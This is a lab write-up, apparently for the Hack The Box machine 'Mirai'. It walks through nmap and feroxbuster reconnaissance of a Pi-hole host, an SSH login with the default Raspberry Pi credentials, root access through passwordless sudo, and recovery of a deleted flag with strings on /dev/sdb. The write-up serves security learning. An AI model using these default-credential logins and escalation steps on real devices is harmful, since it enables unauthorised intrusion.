## Enumeration

We start by running nmap to see what ports are on on the target machine 
```bash
sudo nmap -sV 10.10.10.48
```
`-sV` enables version detection.
Output:
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 05:14 CEST
Nmap scan report for 10.10.10.48
Host is up (0.14s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
53/tcp   open  domain  dnsmasq 2.76
80/tcp   open  http    lighttpd 1.4.35
2020/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Going to 10.10.10.48 gives us a blank page. 
The word list is a bit tricky here I ended up using this
https://github.com/daviddias/node-dirbuster/blob/master/lists/directory-list-2.3-big.txt
```bash
feroxbuster -u http://10.10.10.48/ -w ./directory-list-2.3-big.txt  -x php,sh
```
Output:
```bash
200      GET      280l      980w    14724c http://10.10.10.48/admin/help.php
200      GET       36l      135w     1183c http://10.10.10.48/admin/style/pi-hole.css
200      GET        9l       56w      397c http://10.10.10.48/admin/scripts/pi-hole/js/header.js
200      GET        1l      115w     3094c http://10.10.10.48/admin/style/vendor/skin-blue.min.css
200      GET      208l      543w     5945c http://10.10.10.48/admin/scripts/pi-hole/js/footer.js
200      GET        1l       38w     1649c http://10.10.10.48/admin/img/logo.svg
200      GET       19l      132w     5991c http://10.10.10.48/admin/img/donate.gif
200      GET        1l      112w     4247c http://10.10.10.48/admin/style/vendor/dataTables.bootstrap.min.css
200      GET       71l      165w     1236c http://10.10.10.48/admin/style/vendor/js-warn.css
200      GET       46l      240w    15110c http://10.10.10.48/admin/img/favicon.png
200      GET        8l       42w     1960c http://10.10.10.48/admin/scripts/vendor/dataTables.bootstrap.min.js
200      GET       13l      136w     9222c http://10.10.10.48/admin/scripts/vendor/
200      GET      726l     2006w    27763c http://10.10.10.48/admin/scripts/pi-hole
200      GET      302l      962w    14619c http://10.10.10.48/admin/index.php
200      GET      166l     1158w    82638c http://10.10.10.48/admin/scripts/vendor/
200      GET        4l      702w    28744c http://10.10.10.48/admin/style/vendor/foss
200      GET       11l      779w    52750c http://10.10.10.48/admin/style/vendor/io
200      GET        7l      435w    36868c http://10.10.10.48/admin/style/vendor/bo
200      GET        7l     2297w    83448c http://10.10.10.48/admin/style/vendor/Ad
200      GET        4l     1305w    84345c http://10.10.10.48/admin/scripts/vendor/
200      GET       15l     2441w   192595c http://10.10.10.48/admin/scripts/vendor/
200      GET        6l     2515w   123426c http://10.10.10.48/admin/style/vendor/bo
200      GET       13l     1741w   240027c http://10.10.10.48/admin/scripts/vendor/
200      GET      280l      980w    14724c http://10.10.10.48/admin/list.php
200      GET        1l        1w      186c http://10.10.10.48/admin/api.php
200      GET      280l      980w    14725c http://10.10.10.48/admin/settings.php
200      GET      145l     2311w    14164c http://10.10.10.48/admin/LICENSE
200      GET        1l        1w       13c http://10.10.10.48/versions
200      GET       20l      170w     1085c http://10.10.10.48/admin/scripts/vendor/
200      GET      280l      980w    14725c http://10.10.10.48/admin/debug.php
200      GET       20l      170w     1085c http://10.10.10.48/admin/style/vendor/LI
200      GET      280l      980w    14725c http://10.10.10.48/admin/gravity.php
200      GET      280l      980w    14725c http://10.10.10.48/admin/queries.php
```
Finds all the Pi-hole admin files, but no creds. Can’t log in.

## Observations

With a quick google we can find the default creds:
```bash
ssh pi@10.10.10.48
password: raspberry
```

And we are in!
```bash
ls
Plex  user.txt
cat user.txt 
ff837707441b257*****************
```

`pi` has full sudo permissions:
```bash
sudo -l
(ALL) NOPASSWD: ALL
```
That makes it easy!
```bash
sudo su
root@raspberrypi:/media/usbstick# ls
damnit.txt  lost+found
```
Maybe not :(
## Privileges Escalation

The original `root.txt` was misplaced. This note explicitly states the existence of a backup on a USB stick, guiding you to investigate the mounted USB drive.
```bash
cat ~/root.txt
# "I lost my original root.txt! I think I may have a backup on my USB stick..."
```
Locating the USB Drive:
```bash
mount | grep /media
# /dev/sdb on /media/usbstick
```
This confirms:
- `/dev/sdb` is the device name for the USB stick.
- It's mounted at `/media/usbstick`.

You already checked this mounted folder, but didn't find the backup there directly. This strongly hints that you might need to search at a lower level (the raw device itself).

Inspecting the Mounted USB Filesystem Structure:
```bash
cd /media/usbstick
find . -ls

     2    1 drwxr-xr-x   3 root     root         1024 Aug 14  2017 .
    11   12 drwx------   2 root     root        12288 Aug 14  2017 ./lost+found
    13    1 -rw-r--r--   1 root     root          129 Aug 14  2017 ./damnit.txt
```
The `find . -ls` command shows every file/directory here:
- The USB stick (`.`) root directory.
- The standard `lost+found` directory.
- `damnit.txt`.

No additional hidden files or directories (`root.txt`) appear. Thus, the backup might be stored differently or was deleted, leaving remnants only accessible via lower-level access.
```bash
strings /dev/sdb -n 10
```
This command extracts all readable ASCII character sequences at least 10 characters long directly from the raw device (`/dev/sdb`).

Why does this work?
- Filesystem deletes typically don't erase data immediately; they just mark the file's space as available for reuse.
- The original content might still be recoverable through direct raw access, like reading the device directly.
- The `strings` command is used to scan raw data for meaningful text strings.

Result of Raw Device Inspection:
```bash
/media/usbstick
lost+found
damnit.txt
/media/usbstick
lost+found
damnit.txt
/media/usbstick
lost+found
3d3e483143ff12e*****************
```
